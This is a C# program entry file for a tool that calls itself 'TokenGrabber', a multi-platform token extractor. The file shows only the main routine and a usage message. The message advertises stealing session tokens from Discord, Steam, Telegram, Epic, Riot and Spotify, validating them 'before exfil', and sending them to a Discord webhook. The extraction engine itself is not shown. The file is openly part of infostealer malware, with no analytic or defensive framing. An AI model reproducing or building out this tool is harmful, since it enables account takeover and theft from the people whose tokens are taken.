namespace TokenGrabber;

using TokenGrabber.Config;
using TokenGrabber.Core;

internal static class Program
{
    private static async Task<int> Main(string[] args)
    {
        if (args.Contains("--help"))
        {
            PrintUsage();
            return 0;
        }

        var config = GrabberConfig.Load();
        var engine = new GrabberEngine(config);
        await engine.RunAsync();

        return 0;
    }

    private static void PrintUsage()
    {
        Console.WriteLine("TokenGrabber v3.0.0 - Multi-Platform Token Extraction");
        Console.WriteLine();
        Console.WriteLine("Usage: TokenGrabber.exe [options]");
        Console.WriteLine();
        Console.WriteLine("Options:");
        Console.WriteLine("  --targets <list>    Comma-separated targets (discord,steam,telegram,epic,riot,spotify)");
        Console.WriteLine("  --webhook <url>     Discord webhook URL for delivery");
        Console.WriteLine("  --validate          Validate tokens before exfil");
        Console.WriteLine("  --no-account-info   Skip account info retrieval");
        Console.WriteLine("  --help              Show this help message");
    }
}
